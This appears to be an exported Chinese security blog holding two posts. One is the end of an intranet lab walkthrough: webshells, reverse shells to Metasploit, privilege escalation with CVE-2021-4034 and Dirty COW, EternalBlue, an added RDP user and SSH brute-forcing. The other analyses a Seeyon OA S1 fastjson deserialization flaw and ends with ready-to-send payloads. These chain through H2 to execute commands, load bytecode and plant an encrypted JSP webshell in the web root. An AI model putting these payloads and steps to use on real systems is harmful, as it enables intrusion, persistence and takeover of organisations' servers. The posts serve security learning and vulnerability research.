&gt;3.php&apos;);\n\n\n\n\n\n\n\n\n成功写入\n\n\n\n\n\n\n\n蚁剑连接\n注意：这里会存在连接不上的情况，需要多次尝试，有机会能连上。\n\n\n\n\n\n\n\n蚁剑连接极其不稳定，这里选择在/tmp目录上传一个linux后门，将shell反弹给msf。\n\n\n\n\n\n\n\n运气比较好，一次就上传成功了，正常情况可能需要多次尝试上传。\n打开蚁剑的虚拟终端\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n切换到/tmp目录下，赋予后门执行权限，可以看到执行了很多次才有反应。\n回到MSF下进行监听\n\n\n\n\n\n\n\n执行后门\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n成功反弹（在msf的shell下执行命令流畅很多）。\n在Meterpreter中执行shell得到的终端一片空白\n\n\n\n\n\n\n\n获得一个带标识得终端\nscript -qc /bin/bash /dev/null\n\n\n\n\n\n\n\n\n漏洞分析文件上传分析（直接打包网站源码在win10下进行分析）\nif (isset($_POST['submit'])) &#123;  if (isset($_FILES[\"file\"])) &#123;    // 获取文件后缀名    $tmp = explode(\".\", $_FILES[\"file\"][\"name\"]);    $extension = end($tmp);    if ((($_FILES[\"file\"][\"type\"] == \"image/png\"))      &amp;&amp; ($_FILES[\"file\"][\"size\"] &lt; 204800)   // 小于 200 kb    ) &#123;      if ($_FILES[\"file\"][\"error\"] &gt; 0) &#123;        echo \"&lt;script&gt;alert(错误：: \" . $_FILES[\"file\"][\"error\"] . \"&lt;br&gt;)&lt;/script&gt;\";      &#125; else &#123;        if (move_uploaded_file($_FILES[\"file\"][\"tmp_name\"], \"avatar/\" . 'admin' . \".\" . $extension)) &#123;          echo \"&lt;script&gt;alert('头像上传成功')&lt;/script&gt;\";        &#125; else &#123;          echo \"&lt;script&gt;alert('头像上传失败')&lt;/script&gt;\";        &#125;      &#125;    &#125; else &#123;      echo \"&lt;script&gt;alert('只能上传png格式且小于200KB')&lt;/script&gt;\";    &#125;  &#125;\n\n跟跳板机web服务器的文件上传一模一样，不多说了，可以通过修改Content-Type进行绕过，唯一不同的是对当前web服务的上传路径没有访问权限。\n文件包含\n&lt;?php    if (isset($_GET['page'])) &#123;    \t$file = $_GET['page'];        include $file;    &#125; else &#123;    \techo \"&lt;SCRIPT LANGUAGE=\\\"JavaScript\\\"&gt;location.href='/?page=grbg.php'&lt;/SCRIPT&gt;\";    &#125;?&gt;\n\n从page参数接收文件名，然后对该文件名进行文件包含，可以发现没有任何限制，想怎么玩都可以。\n查看数据库配置文件当我们拿到一个webshell后，虽然权限不高，有很多限制，但是依旧可以通过查看数据库配置文件，拿到数据库的账号密码，然后登录进行查看一些敏感信息。在config/dbconnect.php文件中发现\n\n\n\n\n\n\n\n通过查看数据库配置文件得到mysql服务器的IP、用户名、密码和当前连接的数据库名。意味着我们可以远程连接到192.168.223.3这个主机的mysql服务器。这里先不管，待会再说，先尝试提权。\n提权注意：通过测试不能提到root权限，也问了老师，这台靶机可以不用提到root，以下只是尝试的过程。\n\n\n\n\n\n\n\nLinux的内核版本为5.4.0，操作系统Ubuntu 20.04，版本比较新，未发现提权漏洞。\n看看能不能利用文件有特殊执行权限的suid或sgid进行提取\nfind / -perm -u=s -type f 2&gt;/dev/null  //查找suid文件find / -perm -g=s -type f 2&gt;/dev/null  //查找sgid文件\n\n\n\n\n\n\n\n\n重点关注到sudo和pkexec，因为这两个命令被爆出提权漏洞。\n根据这篇文章\nhttps://www.geekby.site/2021/01/cve-2021-3156%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/\n先查看第一个sudo的版本号\n\n\n\n\n\n\n\n刚好符合在影响版本范围内，进行判断\nsudoedit -s /\n\n\n\n\n\n\n\n\n好像并不 存在漏洞。\n第二个\n\n\n\n\n\n\n\n看起来好像符合漏洞存在的范围，快速判断试试\nsudoedit -s /\n\n\n\n\n\n\n\n\n好像报错了，但是跟存在漏洞的报错又完全不一样。\n我按照博客上文章进行提权。\n\n\n\n\n\n\n\n也没有成功。\n接下来把希望放在pkexec，CVE号CVE-2021-4034,这是去年才爆出来的的漏洞。\n\n\n\n\n\n\n\n提权脚本 https://github.com/berdav/CVE-2021-4034\n\n\n\n\n\n\n\n成功提到root，还是有点惊喜。\n内网渗透：DB服务器渗透刚刚在查看数据库配置文件的时候发现了192.168.223.3这个IP和数据库的账号密码，接下来对该主机进行渗透测试。\n信息收集端口扫描\nproxychains4 nmap -sT 192.168.223.3 -sV\n\n\n\n\n\n\n\n\n开启了80、22、111、3306端口，操作系统为Centos。\nweb渗透测试\n\n\n\n\n\n\n看起来是一个phpMyadmin网站，用来管理mysql数据库的，但是访问连个登录框都没有。\n利用Mysql服务写马接下来用刚刚在配置文件中找的数据库用户名密码进行连接mysql。\n\n\n\n\n\n\n\nproxychains4 mysql -h 192.168.223.3 -u oa -p 144d993ba34367792dfe58370935c4b5\n\n\n\n\n\n\n\n\n成功登录，接下来看看数据库是否具有读写权限。\nselect load_file(&quot;/etc/passwd&quot;);\n\n\n\n\n\n\n\n\n具有读权限，尝试往网站目录/var/www/html下写一句话木马。\nselect 1,&quot;666&lt;?php eval($_POST[&apos;shell&apos;]);?&gt;&quot; into outfile &quot;/var/www/html/shell.php&quot;;\n\n\n\n\n\n\n\n\n访问\n\n\n\n\n\n\n\n成功写入，蚁剑连接（还是会遇到连不上的问题，多连几次就好）\n上传Linux后门，反弹到msf\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n执行\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n反弹成功\n提权\n\n\n\n\n\n\n内核版本和跳板机一样，提权步骤也一样。\n上传提权脚本\nmeterpreter &gt;upload /home/kali/40839.c /tmp/40839.c\n\n\n\n\n\n\n\n\n编译\ngcc -pthread 40839.c -o dirty -lcrypt\n\n\n\n\n\n\n\n\n赋予执行权限并执行\nchmod 777 dirty &amp;&amp; ./dirty\n\n\n\n\n\n\n\n\nssh连接proxychains4 ssh firefart@192.168.223.3\n\n\n\n\n\n\n\n\n成功拿下\n内网渗透：Windows服务器最初，我从外网访问到内网的一台web服务器，通过web漏洞上传php后门渗透进入web服务器，上传了Linux后门，反弹到了MSF上，在通过MSF的route add添加了一条192.168.223.0的路由，用use auxiliary/server/socks_proxy 开启socks5的代理服务，利用proxychains4配置代理后，利用nmap对192.168.223.0/24网段进行主机发现，扫出192.168.223.1和192.168.223.2两个ip，通过文件上传+文件包含的方式拿下了192.168.223.1这台服务器，还剩下192.168.223.2未进行测试,接下来，将对192.168.223.2进行渗透测试。\n信息搜集端口扫描\nproxychains4 nmap -sT 192.168.223.2 -sV\n\n\n\n\n\n\n\n\n可以看到开放了很多端口,主要关注135、139、445三个端口，重点关注445，17年的永恒之蓝漏洞利用工具就是对该端口进行利用，该主机的操作系统Windows Server 2008 R2。\n永恒之蓝接下来使用代理过后的 msf进行检测\nproxychains4 msfconsole\n\n\n\n\n\n\n\n\n关键字ms17-010搜索利用模块\nsearch ms17-010\n\n\n\n\n\n\n\n\n可以先使用模块auxiliary/scanner/smb/smb_ms17_010进行检测，再使用exploit/windows/smb/ms17_010_eternalblue进行利用，不过后者再进行利用的时候也会对其先进行检测，所以直接使用exploit/windows/smb/ms17_010_eternalblue模块。\nuse 0 # 直接选择搜索出来的模块\n\n\n\n\n\n\n\n\n配置模块\n注意：这个模块默认使用windows/x64/meterpreter/reverse_tcp作为payload,因为使用了代理，会出现利用成功却不能反弹回来的情况，所以需要将paylaod改为windows/x64/meterpreter/bind_tcp。\nset RhOSTS 192.168.223.2set payload windows/x64/meterpreter/bind_tcp\n\n\n\n\n\n\n\n\n执行\n\n\n\n\n\n\n\n\n\n\n可以发现，该模块先使用了auxiliary/scanner/smb/smb_ms17_010进行了检测，并检测出了永恒之蓝漏洞。但是这里需要注意的是，不一定百分百连接上，很大可能性利用成功却反弹不回来，多尝试几次就可以连上。\n尝试了四次才成功\n\n\n\n\n\n\n\n因为445端口是smb服务，而smb服务又是系统服务，从该端口拿到的权限就是管理员权限，所以不需要进行提权。\n\n\n\n\n\n\n\n权限维持接下来利用MSF的run post/windows/manage/enable_rdp模块开启windows主机的3389远程桌面\nrun post/windows/manage/enable_rdp  #开启远程桌面\n\n\n\n\n\n\n\n\n添加一个用户\nrun post/windows/manage/enable_rdp USERNAME=fany PASSWORD=123456 #添加用户\n\n\n\n\n\n\n\n\n将windwos服务器的3389转发到攻击机kali的6662端口\nrun post/windows/manage/enable_rdp FORWARD=true LPORT=3389  #将windows服务器的3389端口转发到kali的3389端口\n\n\n\n\n\n\n\n\n接下来，通过win10下的远程桌面连接（mstsc.exe）工具连接到kali的3389端口\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n也可以直接在kali执行\nrdesktop -u fany -p 123456 127.0.0.1:3389\n\n\n\n\n\n\n\n\n永恒之蓝方程式的原生稳定利用方式因为挂了代理，MSF利用起来不是很稳定，有的同学可能有点完美主义，觉得需要多次尝试不够帅气，有没有一次并且很稳定利用成功的方法呢，答案是有，利用shadowbroker工具里的fb.py进行利用，然后通过加载dll的方式加载MSF生成的dll后门，进行反弹。不过我在当前的windows靶机中没有复现成功，报了一个[-] ERROR unrecognized OS string的错误，具体原因参考这篇文章https://captmeelo.com/pentest/2018/06/26/patching-doublepulsar.html，网上相关资料比较少，没继续搞。不过自己在本地搭建的win7环境中，使用该工具能够反弹成功，总之也提供了另一种思路，想学习也可以参考这几篇文章：\nhttps://zhuanlan.zhihu.com/p/153541322\nhttps://blog.51cto.com/hashlinux/2092863\n知识点汇总获得一个带标识得终端python -c &apos;import pty;pty.spawn(&quot;/bin/bash&quot;)&apos;python3 -c &apos;import pty;pty.spawn(&quot;/bin/bash&quot;)&apos;script -qc /bin/bash /dev/null\n\n使用EW做反向代理服务器本地：ew_for_Win.exe -s rcsocks -l 8888 -e 8001远程：./ew_for_linux64 -s rssocks -d 10.200.0.42 -e 8001\n\n命令执行写马?shell=system(&apos;echo &quot;PD9waHAgZXZhbCgkX1BPU1RbJ3NoZWxsJ10pOz8+&quot; | base64 -d &gt;3.php&apos;);\n\nHydra对ssh进行爆破hydra -l 用户名 -P 密码字典 ssh://IP:Port -f -vV -t 10# -l 代表指定一个用户名 -L 代表指定一个用户名字典（密码也是一样）# -f 代表找到后停止# -vV 展示枚举过程# -t 线程\n\n总结 正如一个朋友所说，每个靶机拿到权限的难度很容易，但是很容易被一些细节性的知识点给卡死。我开始做的时候也是一样，先是MSF的代理不能代理，然后换成EW做反向代理，但又不够稳定，遇到解析不了的域名直接就会断掉，尤其是使用火狐浏览器，火狐会自动发一些包到它的服务器，在内网环境下，不能出网，也会直接给断掉。后来搞懂了MSF代理的使用后，才好得多。再就是对内网靶机进行渗透的时候，后门传上去，但是却连不上的问题，还有有OA系统那台服务器的提权，最开始没提上去，后面又成功提上去，都是经过了一次次尝试，最后才成功的，其实这个过程即痛苦又挺有意思，学到东西也很有成就感，总之，搞安全就是需要不断学习，不断进步的。\n","categories":["内网渗透"],"tags":["内网渗透"]},{"title":"致远工作流XML外部实体注入攻击内网S1服务getshell漏洞分析","url":"/2023/10/06/%E8%87%B4%E8%BF%9C%E5%B7%A5%E4%BD%9C%E6%B5%81XML%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%E5%86%85%E7%BD%91S1%E6%9C%8D%E5%8A%A1getshell%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/","content":"漏洞环境V7.1SP1\n漏洞分析S1 fastjosn前台反序列化分析致远的S1服务可以管理致远oa的启动和重启以及一些配置。从V7.1到V8.1SP2，S1的架构从C/S结构改为B/S结构，也就是可以通过浏览器访问，默认开启60001端口，内网访问。\n在致远安装目录下的S1文件夹有一个Agent.jar，将其反编译可以看到S1的源码。\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n在lib目录下可以看到S1服务的一些依赖，可以发现fastjson 1.2.47\n\n\n\n\n\n\n\nfastjson 1.2.47是存在反序列化漏洞的\n\n\n\n\n\n\n\n在jd-gui全局搜索parseObject关键字\n\n\n\n\n\n\n\n找到com.seeyon.common.controller.AuthorityFilterController这个类的authSave方法\n@RestController@RequestMapping(&#123;\"/auth\"&#125;)public class AuthorityFilterController &#123;  private static final Logger LOG = LoggerFactory.getLogger(com.seeyon.common.controller.AuthorityFilterController.class);    @Resource  private IAuthService authService;    @Resource  private IConfigService configService;    @RequestMapping(&#123;\"/authSave\"&#125;)  public String authSave(HttpServletRequest request, HttpServletResponse response) &#123;    if (!dbIsConnection())      return JsonResult.failed(ExceptionEnum.CONNECTIONERROR.getKey(), ExceptionEnum.CONNECTIONERROR.getValue());     String dog = DogUtils.getDogInfo();    String oaExc = ExceptionEnum.OAEXCEPTION.getKey() + \"\";    if (oaExc.equals(dog))      return JsonResult.failed(ExceptionEnum.OAEXCEPTION.getKey(), \");     String auth = request.getParameter(\"auth\");    if (StringUtils.isNotBlank(auth)) &#123;      JSONObject jSONObject = JSON.parseObject(auth);      String header = JSON.toJSONString(jSONObject.get(\"header\"));      if (StringUtils.isBlank(header))        return JsonResult.failed(ExceptionEnum.NOSUCHMETHODEXCEPTION.getKey(), \");       HeaderBean headerBean = (HeaderBean)JSON.parseObject(header, HeaderBean.class);      String dogNo = headerBean.getDogNo();      if (StringUtils.isBlank(dogNo))        return JsonResult.failed(ExceptionEnum.NOSUCHMETHODEXCEPTION.getKey(), \"license);       if (Long.parseLong(dog) != Long.parseLong(dogNo))        return JsonResult.failed(StatusCodeEnum.FAILEDCODE.getKey(), \");     &#125;     Map&lt;String, String&gt; map = new HashMap&lt;&gt;();    map.put(\"type\", \"auth\");    map.put(\"value\", auth);    DynamicDataSourceContextHolder.setDatabaseType(DatabaseType.h2);    int delCount = this.authService.delAuthInfo();    int count = this.authService.authSave(map);    return JsonResult.success(StatusCodeEnum.SUCESSCODE.getKey(), \", new HashMap&lt;&gt;());\n\n在60行会将auth通过fastjson从字符串解析成对象，并且参数是从request请求中获取的。没有看到鉴权，也就是可以通过构造auth参数可以直接通过fastjson反序列化漏洞RCE。\nString auth = request.getParameter(&quot;auth&quot;);if (StringUtils.isNotBlank(auth)) &#123;  JSONObject jSONObject = JSON.parseObject(auth);\n\n直接访问/auth/authsave路由会返回404\n\n\n\n\n\n\n\n因为在BOOT-INF.classes.config.application.properties中指定了agent前缀\n\n\n\n\n\n\n\n所以需要访问\nhttp://localhost:60001/agent/auth/authSave\n\n\n\n\n\n\n\n没有启动oa的情况下会报如上错误\n因为在54行做了检测\n\n\n\n\n\n\n\n启动oa再访问\n\n\n\n\n\n\n\n接下来通过如下payload探测fastjson漏洞是否存在\n&#123;\"@type\":\"java.net.InetSocketAddress\"&#123;\"address\":,\"val\":\"zuw92x.dnslog.cn\"&#125;&#125;\n\n直接将payload url编码后进行提交\n\n\n\n\n\n\n\n这里通过报错信息盲猜需要对payload进行base64编码，再次提交，dnslog收到请求。\n\n\n\n\n\n\n\n在出网的情况下，可以直接使用JdbcRowSetImpl这条链直接远程加载恶意类直接RCE。\n&#123;    &quot;a&quot;:&#123;        &quot;@type&quot;:&quot;java.lang.Class&quot;,        &quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;    &#125;,    &quot;b&quot;:&#123;        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,        &quot;dataSourceName&quot;:&quot;ldap://localhost:808/badNameClass&quot;,        &quot;autoCommit&quot;:true    &#125;&#125;\n\n\n\n\n\n\n\n\nfastjson 配合h2利用链实现不出网利用\n但是很多时候，遇到的都是不出网的情况。从pockyray师傅那了解到fastjson可以通过h2利用链实现不出网利用。\n要知道fastjson在使用parseObject将字符串反序列化成对象的时候，会默认调用该对象的无参构造方法、setter、getter方法。\n所以说只需要在h2依赖中找到一个类，然后这个类中的静态代码块、无参构造方法、setter、getter调用了一些恶意方法或者一些危险的操作,就可以利用fastjson反序列化实现自动调用。。\n既然是通过fastjson反序列化h2依赖中的类，那就先来看看h2中执行命令的几种方式。\n通过p牛发的h2命令执行的文章https://wx.zsxq.com/dweb2/index/topic_detail/185285425815252，`H2`可以通过`CREATE ALIAS`自定义函数执行命令\nCREATE ALIAS shell AS $$void shell(String s) throws Exception &#123;java.lang.Runtime.getRuntime().exec(s);&#125;$$;SELECT shell('cmd /c calc.exe');\n\n但这种方式仅适用于可以执行多条语句的场景。\n但是大部分实际情况下，用户只能控制到JDBC的URL。URL中支持的一个配置 INIT ，INIT 这个参数表示在连接h2数据库时，仅支持执行一条初始化命令。\njdbc:h2:mem:test;MODE=MSSQLServer;INIT=RUNSCRIPT FROM &apos;http://127.0.0.1/test.sql&apos;\n\n在出网的情况通过RUNSCRIPT FROM &#39;http://127.0.0.1/test.sql&#39;  test.sql如上语句执行代码。目的是为了绕过只能执行一条语句的限制，但是我们需要解决的是不出网利用，所以明显不适应。\n如果要想实现不出网利用，可以使用Groovy的方式，但是需要有Groovy依赖\njdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE ALIAS shell2 AS$$@groovy.transform.ASTTest(value=&#123;assert java.lang.Runtime.getRuntime().exec(&quot;cmd.exe /c calc.exe&quot;)&#125;)def x$$\n\n遗憾的是S1中没有看到Groovy的依赖。\n最后文章中说了一种无额外依赖的任意命令执行方法 \n使用CREATE TRIGGER自定义函数的时候，可以使用//javascript 指JavaScript脚本执行。\n\n\n\n\n\n\n\npayload\njdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE TRIGGER shell3 BEFORE SELECT ONINFORMATION_SCHEMA.TABLES AS $$//javascriptjava.lang.Runtime.getRuntime().exec(&apos;cmd /c calc.exe&apos;)$$\n\n但是org.h2.schema.TriggerObject@loadFromSource的方法和S1中h2的方法并不一样\nh2-2.2.220.jar 可以通过如上payload执行代码的版本的org.h2.schema.TriggerObject方法\nprivate Trigger loadFromSource() &#123;    SourceCompiler compiler = database.getCompiler();    synchronized (compiler) &#123;        String fullClassName = Constants.USER_PACKAGE + \".trigger.\" + getName();        compiler.setSource(fullClassName, triggerSource);        try &#123;            if (SourceCompiler.isJavaxScriptSource(triggerSource)) &#123;                return (Trigger) compiler.getCompiledScript(fullClassName).eval();            &#125; else &#123;                final Method m = compiler.getMethod(fullClassName);                if (m.getParameterTypes().length &gt; 0) &#123;                    throw new IllegalStateException(\"No parameters are allowed for a trigger\");                &#125;                return (Trigger) m.invoke(null);            &#125;        &#125; catch (DbException e) &#123;            throw e;        &#125; catch (Exception e) &#123;            throw DbException.get(ErrorCode.SYNTAX_ERROR_1, e, triggerSource);        &#125;    &#125;&#125;\n\nS1依赖中h2-1.4.193.jar的org.h2.schema.TriggerObject方法\nprivate Trigger loadFromSource() &#123;       SourceCompiler compiler = database.getCompiler();       synchronized (compiler) &#123;           String fullClassName = Constants.USER_PACKAGE + \".trigger.\" + getName();           compiler.setSource(fullClassName, triggerSource);           try &#123;               Method m = compiler.getMethod(fullClassName);               if (m.getParameterTypes().length &gt; 0) &#123;                   throw new IllegalStateException(\"No parameters are allowed for a trigger\");               &#125;               return (Trigger) m.invoke(null);           &#125; catch (DbException e) &#123;               throw e;           &#125; catch (Exception e) &#123;               throw DbException.get(ErrorCode.SYNTAX_ERROR_1, e, triggerSource);           &#125;       &#125;   &#125;\n\n没有了return (Trigger) compiler.getCompiledScript(fullClassName).eval();这条语句，也就意味着，不能通过最后一种方法执行命令，也没戏。\n我问了伊雷利亚师傅，师傅反问我为什么要用为什么大家只能用runscript，是有什么限制么?，我说只能执行一条语句，师傅反问真的只能执行一条语句嘛。\n于是我跟了一下通过控制JDBCURL执行命令利用点\n调用链\norg.h2.server.web.WebApp#process    org.h2.server.web.WebApp#test\t\torg.h2.server.web.WebServer#getConnection\n\n在org.h2.server.web.WebServer#getConnection方法中\nConnection getConnection(String var1, String var2, String var3, String var4) throws SQLException &#123;        var1 = var1.trim();        var2 = var2.trim();        Driver.load();        Properties var5 = new Properties();        var5.setProperty(\"user\", var3.trim());        var5.setProperty(\"password\", var4);        if (var2.startsWith(\"jdbc:h2:\")) &#123;            if (this.ifExists) &#123;                var2 = var2 + \";IFEXISTS=TRUE\";            &#125;            return Driver.load().connect(var2, var5);        &#125; else &#123;            return JdbcUtils.getConnection(var1, var2, var5);        &#125;    &#125;\n\n这个方法是通过用户名密码和JDBCURL去获取一个Connection对象的方法，如果JDBCURL中开头为jdbc:h2:，则调用Driver.load().connect(var2, var5)。\nDriver.load().connect是一个public方法，我们在本地构建一下命令执行的参数进行调用。\nfinal Properties properties = new Properties();properties.put(\"user\", \"test\");properties.put(\"password\", \"test\");String url = \"jdbc:h2:mem:test;MODE=MSSQLServer;INIT=CREATE ALIAS shell AS $$void shell(String s) throws Exception &#123;\\njava.lang.Runtime.getRuntime().exec(s);\\n&#125;$$;\\nSELECT shell('cmd /c calc.exe');\\n\";final Connection connect = Driver.load().connect(url, properties);\n\n\n\n\n\n\n\n\n会报一个URL format error;的错误。问了伊雷利亚师傅，需要对;进行转义。\nString url = \"jdbc:h2:mem:test;MODE=MSSQLServer;INIT=CREATE ALIAS shell AS $$void shell(String s) throws Exception &#123;\\njava.lang.Runtime.getRuntime().exec(s)\\\\;\\n&#125;$$\\\\;\\nSELECT shell('cmd /c calc.exe')\\\\;\\n\";\n\n执行\n\n\n\n\n\n\n\n计算器真的蹦出来了。之前文章中写的INIT后面写的只支持一条语句，在h2-1.4.193这个版本貌似没有限制。\nINIT后面的语句是通过org.h2.engine.Engine#openSession方法中prepareCommand执行的。据伊雷利亚师傅说是支持多语句执行的。\n\n\n\n\n\n\n\n所以，目前已经在h2-1.4.193找到了执行命令的方法，是通过调用Driver.load().connect(url, properties)方法，控制url参数来执行命令。\nJdbcDataSource\n在org.h2.jdbcx.JdbcDataSource这个类中getJdbcConnection方法中\n\n\n\n\n\n\n\n我们同样看到了Driver.load().connect。并且还是getter方法，满足了fastjson反序列化自动调用的条件。\n在fastjson 1.2.47中，使用如下payload触发反序列化\n&#123;\"@type\":\"com.alibaba.fastjson.JSONObject\",&#123;    \"a\":&#123;        \"@type\":\"java.lang.Class\",        \"val\":\"org.h2.jdbcx.JdbcDataSource\"    &#125;,    \"b\":&#123;        \"@type\":\"org.h2.jdbcx.JdbcDataSource\",        \"url\":\"jdbc:h2:mem:test;MODE=MSSQLServer;INIT=CREATE ALIAS shell AS $$void shell(String s) throws Exception &#123;java.lang.Runtime.getRuntime().exec(s)\\\\;&#125;$$\\\\;SELECT shell('cmd /c calc.exe');\",    &#125;&#125;&#125;\"\"&#125;\n\n\n\n\n\n\n\n\n但是执行并不会蹦出计算机，原因是该payload在fastjson 1.2.47下只能会调用静态代码块、无参构造以及setter方法\n\n\n\n\n\n\n\n还需要给payload 加上，就会自动调用getter方法了\n&quot;language&quot;:&#123;&quot;@type&quot;:&quot;java.lang.String&quot;&#123;&quot;$ref&quot;:&quot;$&quot;&#125;\n\n\n\n\n\n\n\n\n最终fastjson调用JdbcDataSource的蹦计算器的payload如下\n&#123;\"@type\":\"com.alibaba.fastjson.JSONObject\",&#123;    \"a\":&#123;        \"@type\":\"java.lang.Class\",        \"val\":\"org.h2.jdbcx.JdbcDataSource\"    &#125;,    \"b\":&#123;        \"@type\":\"org.h2.jdbcx.JdbcDataSource\",        \"url\":\"jdbc:h2:mem:test;MODE=MSSQLServer;INIT=CREATE ALIAS shell AS $$void shell(String s) throws Exception &#123;java.lang.Runtime.getRuntime().exec(s)\\\\;&#125;$$\\\\;SELECT shell('cmd /c calc.exe');\",    &#125;,\t\"language\":&#123;\"@type\":\"java.lang.String\"&#123;\"$ref\":\"$\"&#125;&#125;&#125;\"\"&#125;\n\n 加载字节码 payload\n&#123;\"@type\":\"com.alibaba.fastjson.JSONObject\",&#123;    \"a\":&#123;        \"@type\":\"java.lang.Class\",        \"val\":\"org.h2.jdbcx.JdbcDataSource\"    &#125;,    \"b\":&#123;        \"@type\":\"org.h2.jdbcx.JdbcDataSource\",        \"url\":\"jdbc:h2:mem:test;MODE=MSSQLServer;INIT=CREATE ALIAS shell22 AS $$void shell22() throws Exception &#123;java.lang.reflect.Method defineClass = null\\\\;defineClass = java.lang.ClassLoader.class.getDeclaredMethod(\\\"defineClass\\\", String.class, byte[].class, int.class, int.class)\\\\;defineClass.setAccessible(true)\\\\;byte[] code = java.util.Base64.getDecoder().decode(\\\"内存马字节码base64编码\\\")\\\\;Class hello = (Class)defineClass.invoke(ClassLoader.getSystemClassLoader(), \\\"WriteShell\\\", code, 0, code.length)\\\\;hello.newInstance()\\\\;&#125;$$\\\\;SELECT shell22()\\\\;\",    &#125;,\t\"language\":&#123;\"@type\":\"java.lang.String\"&#123;\"$ref\":\"$\"&#125;&#125;&#125;\"\"&#125;\n\n坑点：只能打一次\n向致远web路径写入shell payload\n&#123;\"@type\":\"com.alibaba.fastjson.JSONObject\",&#123;\t\"a\":&#123;\t\t\"@type\":\"java.lang.Class\",\t\t\"val\":\"org.h2.jdbcx.JdbcDataSource\"\t&#125;,\t\"b\":&#123;\t\t\"@type\":\"org.h2.jdbcx.JdbcDataSource\",\t\t\"url\":\"jdbc:h2:mem:test;MODE=MSSQLServer;INIT=CREATE ALIAS shell4 AS $$void shell4() throws Exception &#123;java.io.PrintWriter printWriter2 = new java.io.PrintWriter(\\\"../ApacheJetspeed/webapps/ROOT/404.jsp\\\")\\\\;String s = \\\"PCVAcGFnZSBpbXBvcnQ9ImphdmEudXRpbC4qLGphdmEuaW8uKixqYXZheC5jcnlwdG8uKixqYXZheC5jcnlwdG8uc3BlYy4qIiU+PCUhY2xhc3MgVSBleHRlbmRzIENsYXNzTG9hZGVyIHsKCQlVKENsYXNzTG9hZGVyIGMpIHsKCQkJc3VwZXIoYyk7CgkJfQoJCXB1YmxpYyBDbGFzcyBnKGJ5dGVbXSBiKSB7CgkJCXJldHVybiBzdXBlci5kZWZpbmVDbGFzcyhiLCAwLCBiLmxlbmd0aCk7CgkJfQoJfSU+CjwlCnRyeXsKCQlTdHJpbmcga2V5PSI5MDBiYzg4NWQ3NTUzMzc1IjsKCQlyZXF1ZXN0LnNldEF0dHJpYnV0ZSgic2t5Iiwga2V5KTsKCQlTdHJpbmcgZGF0YT1yZXF1ZXN0LmdldFJlYWRlcigpLnJlYWRMaW5lKCk7CgkJaWYgKGRhdGEhPSBudWxsKSB7CgkJCVN0cmluZyB2ZXIgPSBTeXN0ZW0uZ2V0UHJvcGVydHkoImphdmEudmVyc2lvbiIpOwoJCQlieXRlW10gY29kZT1udWxsOwoJICAgICAgICBpZiAodmVyLmNvbXBhcmVUbygiMS44IikgPj0gMCkgewoJICAgICAgICAgICAgQ2xhc3MgQmFzZTY0ID0gQ2xhc3MuZm9yTmFtZSgiamF2YS51dGlsLkJhc2U2NCIpOwoJICAgICAgICAgICAgT2JqZWN0IERlY29kZXIgPSBCYXNlNjQuZ2V0TWV0aG9kKCJnZXREZWNvZGVyIiwgKENsYXNzW10pIG51bGwpLmludm9rZShCYXNlNjQsIChPYmplY3RbXSkgbnVsbCk7CgkgICAgICAgICAgICBjb2RlID0gKGJ5dGVbXSkgRGVjb2Rlci5nZXRDbGFzcygpLmdldE1ldGhvZCgiZGVjb2RlIiwgbmV3IENsYXNzW117Ynl0ZVtdLmNsYXNzfSkuaW52b2tlKERlY29kZXIsIG5ldyBPYmplY3RbXXtkYXRhLmdldEJ5dGVzKCJVVEYtOCIpfSk7CgkgICAgICAgIH0gZWxzZSB7CgkgICAgICAgICAgICBDbGFzcyBCYXNlNjQgPSBDbGFzcy5mb3JOYW1lKCJzdW4ubWlzYy5CQVNFNjREZWNvZGVyIik7CgkgICAgICAgICAgICBPYmplY3QgRGVjb2RlciA9IEJhc2U2NC5uZXdJbnN0YW5jZSgpOwoJICAgICAgICAgICAgY29kZSA9IChieXRlW10pIERlY29kZXIuZ2V0Q2xhc3MoKS5nZXRNZXRob2QoImRlY29kZUJ1ZmZlciIsIG5ldyBDbGFzc1tde1N0cmluZy5jbGFzc30pLmludm9rZShEZWNvZGVyLCBuZXcgT2JqZWN0W117ZGF0YX0pOwoJICAgICAgICB9CgkJCUNpcGhlciBjID0gQ2lwaGVyLmdldEluc3RhbmNlKCJBRVMiKTsKCQkJYy5pbml0KDIsIG5ldyBTZWNyZXRLZXlTcGVjKGtleS5nZXRCeXRlcygpLCAiQUVTIikpOwoJCQluZXcgVSh0aGlzLmdldENsYXNzKCkuZ2V0Q2xhc3NMb2FkZXIoKSkuZyhjLmRvRmluYWwoY29kZSkpLm5ld0luc3RhbmNlKCkuZXF1YWxzKHBhZ2VDb250ZXh0KTsKCQl9Cgl9Y2F0Y2goRXhjZXB0aW9uIGUpewp9OwpvdXQ9cGFnZUNvbnRleHQucHVzaEJvZHkoKTsKJT4=\\\"\\\\;String decodeString = new String(java.util.Base64.getDecoder().decode(s),\\\"UTF-8\\\")\\\\;printWriter2.println(decodeString)\\\\;printWriter2.close()\\\\;&#125;$$\\\\;SELECT shell4()\\\\;\",\t&#125;,\t\"language\":&#123;\"@type\":\"java.lang.String\"&#123;\"$ref\":\"$\"&#125;&#125;&#125;\"\"&#125;\n\n最后只需要将如上payload 进行base64编码，往S1 /agent/auth/authSave接口发，即可实现不出网getshell\n\n\n\n\n\n\n\n\n致远 工作流XML外部实体注入 